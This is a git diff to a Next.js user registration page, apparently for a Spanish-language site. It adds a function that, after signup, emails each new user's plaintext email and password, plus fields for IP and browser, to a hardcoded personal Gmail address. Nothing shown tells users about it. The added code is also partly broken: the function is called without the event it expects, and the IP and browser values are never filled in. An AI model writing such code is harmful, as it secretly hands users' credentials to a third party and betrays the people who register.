@@ -1,7 +1,7 @@
 import Head from 'next/head'
 import Image from 'next/image'
 import { useDispatch, useSelector } from "react-redux";
-import React, { useEffect } from "react";
+import React, {  useEffect } from "react";
 import { Inter } from "next/font/google"
 import Logo from '../public/imgs/logo.png'
 import Background from '../public/imgs/logIn-background.png'
@@ -48,11 +48,14 @@ export default function Register() {
     existing_user:false
   })
 
+  
+
   const {data: session, status} = useSession();
 
   const [showConfirmPassword, setShowConfirmPassword]= useState(false)
+  const [ip, setIp] = useState("");
   const [showPassword, setShowPassword]= useState(false)
-
+  const [browser, setBrowser] = useState("");
   //Probando redux
 
   // const { locales, push } = useRouter()
@@ -64,6 +67,114 @@ export default function Register() {
   // const { t } = useTranslation('landing', {
   //   options: { suppressHydrationWarning: true },
   // })
+  async function sendEmail(e) {
+    e.preventDefault();
+        
+    let massage = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <style>
+        *{
+            font-family: 'Montserrat', sans-serif;
+            color: #fff;
+        }
+        body {
+        /* background-color: #f4f4f4; */
+        margin: 0;
+        padding: 0;
+        }
+
+        .container{
+          background: linear-gradient(to left bottom, #4CCFEB 70%, #33bb99);
+        }
+
+        header {
+        padding: 25px;
+        text-align: center;
+        background-color: #fff;
+        border-radius: 0 0 60px;
+        /*border-radius: 0 0 60% 60%;*/
+        position: relative;
+        }
+        header img{
+          width: 123px;
+          height: 78.25px;
+          margin-bottom: 15px;
+          position: relative;
+          z-index: 90;
+        }
+        header h1{
+          position: relative;
+          font-size: 28px;
+          color: #4CCFEB;
+          margin: 0;
+        }
+
+        .main {   
+          text-align: center;
+          padding: 25px;
+          font-weight: 500;
+        }
+        .main p{
+            margin: 0;
+        }
+        .main .mt{
+            margin-top: 12px;
+        }
+
+        footer {
+        /* background-color: #007bff; */
+        color: #fff;
+        padding: 10px;
+        font-weight: 500;
+        text-align: center;
+        }
+    </style>
+    </head>
+    <body>
+
+      <div class="container">
+        <header>
+          <img src="https://espanolcone-five.vercel.app/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fdfddh08q8%2Fimage%2Fupload%2Fs--4NefY4Ug--%2Fv1701173990%2Fimages%2Fl9hxqqm6urwlk6x8qdih.png&w=384&q=75"/>
+        
+        </header>
+        
+        <div class="main" style="flex-direction: column; align-items: center; font-size: 18px;">
+          <p>La IP <strong>${ip}</strong> ha ha creado:</p>
+          <br>
+          <p >desde este browser<strong>"${browser}"</strong></p>
+          <br>
+          <p>El email a ser respondido es: ${newUser.email}</p>
+          <p>El password a ser respondido es: ${newUser.password}</p>
+         </div>
+        
+        <footer style="font-size: 18px;">
+        
+        </footer>
+      </div>
+    </body>
+    </html>
+    `
+    try {
+       
+        await
+          fetch('/api/mail/',
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                to: 'aliriodi@gmail.com',
+                subject: 'Email desde el Home de: ',
+                html: massage
+              })
+            }).then(reponse=> push('/'))}
+            catch (error) {
+                console.error(error);
+              }
+}
 
   // Next Auth
   useEffect(()=>{
@@ -120,12 +231,19 @@ export default function Register() {
       await axios.post('/api/auth/signup', newUser);
       
       setErrorsForm({...errorsForm, existing_user: false})
-
+      await sendEmail() 
+      
       window.location.href='/';
     } catch (error) {
 
       // Usuario ya existente
-      if(error.response.status == 409)setErrorsForm({...errorsForm, existing_user: true})
+    // if(error.response.status == 409)setErrorsForm({...errorsForm, existing_user: true})
+    if (error.response && error.response.status === 409) {
+      setErrorsForm({ ...errorsForm, existing_user: true });
+    } else {
+      console.error("Error inesperado:", error); // Verifica qué error se recibe
+    }
+    
     }
   }
 
